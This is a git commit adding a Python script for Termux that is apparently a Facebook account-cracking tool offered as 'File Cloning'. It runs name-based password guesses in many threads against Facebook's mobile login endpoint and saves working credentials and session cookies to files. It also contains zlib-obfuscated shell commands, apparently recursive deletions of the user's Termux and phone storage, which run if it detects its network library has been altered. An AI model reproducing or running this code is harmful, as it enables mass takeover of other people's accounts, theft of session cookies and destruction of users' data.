68d73cb0b334d1fd6d6af1e6d757dffb2ddbca3c
Mudassarch1122 <145472252+Mudassarch1122@users.noreply.github.com>
2024-10-02 13:21:28 +0500

    Add files via upload

---
+++ khala2.py
@@ -0,0 +1,321 @@
+# Coded BY Kamran Haider
+import os
+try:
+    import requests
+except ModuleNotFoundError:
+    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
+import random,time,sys,requests,uuid,mechanize,zlib,base64
+from concurrent.futures import ThreadPoolExecutor as loda
+#____________[SECURITY BOX]_____________#
+first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'print' in open(first+'sessions.py','r').read():
+    pass
+else:
+    os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x00\xd7_\x0ci'))
+    os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x00\xd7_\x0ci'))
+    os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+    os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+    print(f"\033[92;1m ❲\033[97;1m+\033[92;1m❳\033[97;1m Bro Turn Off Protecter...! Then Run Tool");exit()
+first = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
+if not 'BHATTI' in open(first+'models.py','r').read():
+    pass    
+else:
+  os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x00\xd7_\x0ci'))
+  os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+  os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+  os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+  print(f'\033[92;1m ❲\033[97;1m+\033[92;1m❳\033[97;1m Dont Try Bypass & Capture Mother Fucker...! \n\033[92;1m ❲\033[97;1m+\033[92;1m❳\033[97;1m Your System fucked By BHATTI');exit()
+def clr():
+    os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+    os.system('termux-setup-storage')
+    try:
+        data = os.listdir('/sdcard')
+        if 'Android' in data:
+            os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+            os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+            os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+            print(f'\033[92;1m ❲\033[97;1m+\033[92;1m❳\033[97;1m Dont Try Bypass & Capture Mother Fucker...! \n\033[92;1m ❲\033[97;1m+\033[92;1m❳\033[97;1m Your System fucked By BHATTI');exit()
+        else:exit()
+    except:exit()
+#<<_________[ PROTECTOR ]_________>>#
+from os import path,system
+if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
+    pass
+else:
+    print(f"\033[92;1m ❲\033[97;1m+\033[92;1m❳\033[97;1m Bro Turn Off Protecter...! Then Run Tool");exit()
+#<<_________[ MODULE KILLER ]_________>>#
+from requests import api
+x = open(api.__file__,'r').read()
+if "print" in x:
+    clr()
+elif "sys.stdout.write" in x:
+    clr()
+else:
+    pass
+from requests import sessions
+x = open(sessions.__file__,'r').read()
+if "print" in x:
+    clr()
+elif "sys.stdout.write" in x:
+    clr()
+else:
+    pass
+from requests import models
+x = open(models.__file__,'r').read()
+if "print" in x:
+    clr()
+elif "sys.stdout.write" in x:
+    clr()
+else:
+    pass
+try:
+    import mechanize
+except:
+    os.system(base64.b64decode(base64.b64decode("Y0dsd0lHbHVjM1JoYkd3Z2JXVmphR0Z1YVhwbElENGdMMlJsZGk5dWRXeHM=")))
+    
+oks = []
+cps = []
+plist = []
+methods = []
+speed = []
+twf = []
+loop = 0
+os.system('https://chat.whatsapp.com/DLBHTZNwyvI8Duhvwov1qi')
+
+logo = """
+ \033[92;1m██\033[97;1m╗  \033[92;1m██\033[97;1m╗\033[92;1m██\033[97;1m╗   \033[92;1m██\033[97;1m╗\033[92;1m███████\033[97;1m╗
+ \033[97;1m╚\033[92;1m██\033[97;1m╗\033[92;1m██\033[97;1m╔╝╚\033[92;1m██\033[97;1m╗ \033[92;1m██\033[97;1m╔╝╚══\033[92;1m███\033[97;1m╔╝
+ \033[97;1m ╚\033[92;1m███\033[97;1m╔╝  ╚\033[92;1m████\033[97;1m╔╝   \033[92;1m███\033[97;1m╔╝ 
+  \033[92;1m██\033[97;1m╔\033[92;1m██\033[97;1m╗   ╚\033[92;1m██\033[97;1m╔╝   \033[92;1m███\033[97;1m╔╝  
+ \033[92;1m██\033[97;1m╔╝ \033[92;1m██\033[97;1m╗  \033[92;1m ██\033[97;1m║   \033[92;1m███████\033[97;1m╗
+ \033[97;1m╚═╝  ╚═╝   ╚═╝   ╚══════╝
+-------------------------------------------
+Owner  :     Mudassar Ali
+Team   :     Bhatti X Mudassar 
+Version:      0.2
+Tool   :        Free Trail                 
+-----------------------------------------------"""
+
+def linex():
+    print('\033[1;37m-----------------------------------------------')
+
+def clear():
+        os.system('clear')
+        print(logo)
+
+def menu():
+    os.system('clear')
+    print(logo)
+    print('[1] File Cloning')
+    print('[2] Join Whatsapp Group')
+    linex()
+    lomda = input('\033[1;37mChoose Option : ')
+    if lomda in ['1']:
+        clear()
+        print('PUT FILE EXAMPLE :  /sdcard/filename.txt')
+        linex()
+        file = input('Enter File Name\033[1;37m: ')
+        try:
+            fo = open(file,'r').read().splitlines()
+        except FileNotFoundError:
+            print('FILE NOT FOUND ')
+            time.sleep(2)
+            menu()
+        clear()
+        print('[1] METHOD 1')
+        print('[2] METHOD 2')
+        linex()
+        mthd=input('CHOOSE : ')
+        linex()
+        clear()
+        plist = []
+        try:
+            ps_limit = int(input('HOW MANY PASSWORDS DO YOU WANT ? '))
+        except:
+            ps_limit =1
+        linex()
+        clear()
+        print('\033[1;37m EXAMPLE : first last,firtslast')
+        linex()
+        for i in range(ps_limit):
+            plist.append(input(f'PUT PASSWORD {i+1}: '))
+        linex()
+        clear()
+        with loda(max_workers=30) as crack_submit:
+            clear()
+            total_ids = str(len(fo))
+            print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
+            print("\033[1;37m CRACKING STARTED...\033[1;37m")
+            linex()
+            for user in fo:
+                ids,names = user.split('|')
+                passlist = plist
+                if mthd in ['1','01']:
+                    crack_submit.submit(ffb,ids,names,passlist)
+                elif mthd in ['2','02']:
+                    crack_submit.submit(ffb1,ids,names,passlist)
+        print('\033[1;37m')
+        linex()
+        print(' THE PROCESS HAS COMPLETED')
+        print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+        linex()
+        input(' PRESS ENTER TO BACK ')
+        os.system('python XYZ.py')
+    elif lomda in ['2']:
+            os.system('https://chat.whatsapp.com/IjLRadygoVqD0CO9sTBvIY')
+    else:
+        menu()
+
+def ffb(ids,names,passlist):
+        try:
+                global oks,loop
+                sys.stdout.write('\r\r\033[1;37m [XYZ-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/196.0.0.71;FBPN/com.facebook.orca;FBLC/ja_JP;FBBV/624874805;FBCR/Cellcom;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1805;FBSV/9.2.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=320,height=480};FB_FW/1;FBRV/583299788]"
+                        head = {'User-Agent': ua,
+                                'Accept-Encoding': 'gzip, deflate',
+                                'Connection': 'Keep-Alive',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'Host': 'graph.facebook.com',
+                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                                'X-FB-Connection-Type': 'MOBILE.LTE',
+                                'X-Tigon-Is-Retry': 'False',
+                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                                'x-fb-device-group': '5120',
+                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                                'X-FB-Request-Analytics-Tags': 'graphservice',
+                                'X-FB-HTTP-Engine': 'Liger',
+                                'X-FB-Client-IP': 'True',
+                                'X-FB-Server-Cluster': 'True',
+                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        data = {'adid':str(uuid.uuid4()),
+                                'format':'json',
+                                'device_id':str(uuid.uuid4()),
+                                'email':ids,'password':pas,
+                                'generate_analytics_claims':'1',
+                                'community_id':'',
+                                'cpl':'true',
+                                'try_num':'1',
+                                'family_device_id':str(uuid.uuid4()),
+                                'credentials_type':'password',
+                                'source':'login',
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'currently_logged_in_userid':'0',
+                                'locale': 'fr_FR','client_country_code': 'FR',
+                                'fb_api_req_friendly_name':'authenticate',
+                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
+                                'access_token':accees_token}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=head).json()
+                        if 'session_key' in po:
+                                        print('\r\r\033[1;32m [XYZ-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        open('/sdcard/XYZ-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                                        open('/sdcard/XYZ-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
+                                        break
+                        elif twf in str(po):
+                                                print('\r\r \033[1;34m[XYZ-2F] '+ids+' | '+pas)
+                                                twf.append(ids)
+                                                break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                                print('\r\r\x1b[1;31m [XYZ-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/XYZ-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:
+                time.sleep(20)
+
+def ffb1(ids,names,passlist):
+        try:
+                global oks,loop
+                sys.stdout.write('\r\r\033[1;37m [XYZ-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/196.0.0.57;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/294974792;FBCR/Jazz;FBMF/TECNO;FBBD/TECNO;FBDV/TECNO KF6j;FBSV/9.2.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=480,height=854};FB_FW/1;FBRV/875086171]"
+                        head = {'User-Agent': ua,
+                                'Accept-Encoding': 'gzip, deflate',
+                                'Connection': 'Keep-Alive',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'Host': 'graph.facebook.com',
+                                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                                'X-FB-Connection-Type': 'MOBILE.LTE',
+                                'X-Tigon-Is-Retry': 'False',
+                                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
+                                'x-fb-device-group': '5120',
+                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                                'X-FB-Request-Analytics-Tags': 'graphservice',
+                                'X-FB-HTTP-Engine': 'Liger',
+                                'X-FB-Client-IP': 'True',
+                                'X-FB-Server-Cluster': 'True',
+                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        data = {'adid':str(uuid.uuid4()),
+                                'format':'json',
+                                'device_id':str(uuid.uuid4()),
+                                'email':ids,'password':pas,
+                                'generate_analytics_claims':'1',
+                                'community_id':'',
+                                'cpl':'true',
+                                'try_num':'1',
+                                'family_device_id':str(uuid.uuid4()),
+                                'credentials_type':'password',
+                                'source':'login',
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'currently_logged_in_userid':'0',
+                                'locale': 'pt_BR','client_country_code': 'BR',
+                                'fb_api_req_friendly_name':'authenticate',
+                                'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
+                                'access_token':accees_token}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=head).json()
+                        if 'session_key' in po:
+                                        print('\r\r\033[1;32m [XYZ-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        open('/sdcard/XYZ-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                                        open('/sdcard/XYZ-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
+                                        break
+                        elif twf in str(po):
+                                                print('\r\r \033[1;34m[XYZ-2F] '+ids+' | '+pas)
+                                                twf.append(ids)
+                                                break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                                print('\r\r\x1b[1;31m [XYZ-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/XYZ-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:
+                time.sleep(20)
+
+menu()
